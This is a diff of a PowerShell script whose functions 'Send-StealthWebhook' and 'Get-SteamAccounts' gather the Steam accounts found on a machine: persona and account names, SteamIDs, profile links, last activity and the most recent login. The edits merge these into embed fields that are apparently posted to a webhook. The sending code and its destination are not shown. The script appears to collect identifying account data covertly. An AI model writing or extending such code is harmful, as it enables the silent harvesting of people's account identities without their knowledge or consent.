@@ -1510,22 +1510,34 @@ function Send-StealthWebhook {
                     @{ name = 'Detection Method'; value = $method; inline = $false }
                 )
                 
-                # Add Steam Login information to first embed only to avoid duplication
-                if ($embeds.Count -eq 0 -and $steamLibraryInfo.LoginHistory.Count -gt 0) {
-                    $libraryLines = @()
-                    if ($steamLibraryInfo.MostRecentAccount) {
-                        $libraryLines += "**Most Recent:** $($steamLibraryInfo.MostRecentAccount)"
-                        $libraryLines += ""  # Blank line
-                    }
+                # Add Steam accounts to first embed only (consolidated format)
+                if ($embeds.Count -eq 0) {
+                    $steamAccounts = Get-SteamAccounts
                     
-                    $historyLines = $steamLibraryInfo.LoginHistory | Select-Object -First 3 | ForEach-Object {
-                        $displayName = if ($_.PersonaName -ne $_.AccountName) { "$($_.PersonaName) ($($_.AccountName))" } else { $_.AccountName }
-                        "**$displayName**: $($_.LastLoginTime)"
+                    if ($steamAccounts.Count -gt 0 -or $steamLibraryInfo.LoginHistory.Count -gt 0) {
+                        $steamLines = @()
+                        
+                        # Most recent account
+                        if ($steamLibraryInfo.MostRecentAccount) {
+                            $steamLines += "🎮 **Most Recent:** $($steamLibraryInfo.MostRecentAccount)"
+                            $steamLines += ""
+                        }
+                        
+                        # Top 3 accounts with activity details
+                        $accountLines = $steamAccounts | Select-Object -First 3 | ForEach-Object {
+                            $displayName = if ($_.PersonaName -and $_.PersonaName -ne $_.UserName) {
+                                "$($_.PersonaName) [$($_.AccountName)]"
+                            } else {
+                                "$($_.UserName) [$($_.AccountName)]"
+                            }
+                            
+                            "**$displayName**`n└ $($_.LastActivity) ($($_.ActivitySource))`n└ SteamID: $($_.SteamID)"
+                        }
+                        
+                        $steamLines += $accountLines
+                        $steamValue = $steamLines -join "`n`n"
+                        $fieldsArray += @{ name = "Steam Accounts ($($steamAccounts.Count))"; value = $steamValue; inline = $false }
                     }
-                    $libraryLines += $historyLines
-                    
-                    $libraryValue = $libraryLines -join "`n"
-                    $fieldsArray += @{ name = "Steam Account History"; value = $libraryValue; inline = $false }
                 }
                 
                 $embed = @{
@@ -2144,35 +2156,32 @@ function Get-SteamAccounts {
             @{ name = 'UserID';    value = "$UserId";   inline = $true }
         )
         
-        # Add Steam accounts field
-        if ($steamAccounts.Count -gt 0) {
-            $steamLines = $steamAccounts | ForEach-Object {
-                "**$($_.UserName)** ([$($_.SteamID)]($($_.ProfileUrl)))`nLast Activity: $($_.LastActivity) ($($_.ActivitySource))"
+        # Add consolidated Steam accounts section
+        if ($steamAccounts.Count -gt 0 -or $steamLibraryInfo.LoginHistory.Count -gt 0) {
+            $steamLines = @()
+            
+            # Show most recent account at the top
+            if ($steamLibraryInfo.MostRecentAccount) {
+                $steamLines += "🎮 **Most Recent:** $($steamLibraryInfo.MostRecentAccount)"
+                $steamLines += ""
             }
+            
+            # Build combined account list (sorted by most recent activity)
+            $accountLines = $steamAccounts | ForEach-Object {
+                $displayName = if ($_.PersonaName -and $_.PersonaName -ne $_.UserName) {
+                    "$($_.PersonaName) [$($_.AccountName)]"
+                } else {
+                    "$($_.UserName) [$($_.AccountName)]"
+                }
+                
+                "**$displayName**`n└ Last Activity: $($_.LastActivity) ($($_.ActivitySource))`n└ SteamID: [$($_.SteamID)]($($_.ProfileUrl))"
+            }
+            
+            $steamLines += $accountLines
             $steamValue = $steamLines -join "`n`n"
             $fieldsArray += @{ name = "Steam Accounts ($($steamAccounts.Count))"; value = $steamValue; inline = $false }
         } else {
             $fieldsArray += @{ name = 'Steam Accounts'; value = 'None detected'; inline = $false }
-        }
-        
-        # Add Steam Login information
-        if ($steamLibraryInfo.LoginHistory.Count -gt 0) {
-            $libraryLines = @()
-            if ($steamLibraryInfo.MostRecentAccount) {
-                $libraryLines += "**Most Recent:** $($steamLibraryInfo.MostRecentAccount)"
-                $libraryLines += ""  # Blank line for spacing
-            }
-            
-            $historyLines = $steamLibraryInfo.LoginHistory | Select-Object -First 5 | ForEach-Object {
-                $displayName = if ($_.PersonaName -ne $_.AccountName) { "$($_.PersonaName) ($($_.AccountName))" } else { $_.AccountName }
-                "**$displayName**`nLast Logged In: $($_.LastLoginTime)`nSteamID: $($_.SteamID)"
-            }
-            $libraryLines += $historyLines
-            
-            $libraryValue = $libraryLines -join "`n"
-            $fieldsArray += @{ name = "Steam Account History"; value = $libraryValue; inline = $false }
-        } else {
-            $fieldsArray += @{ name = 'Steam Account History'; value = 'No login data found'; inline = $false }
         }
         
         $embed = @{
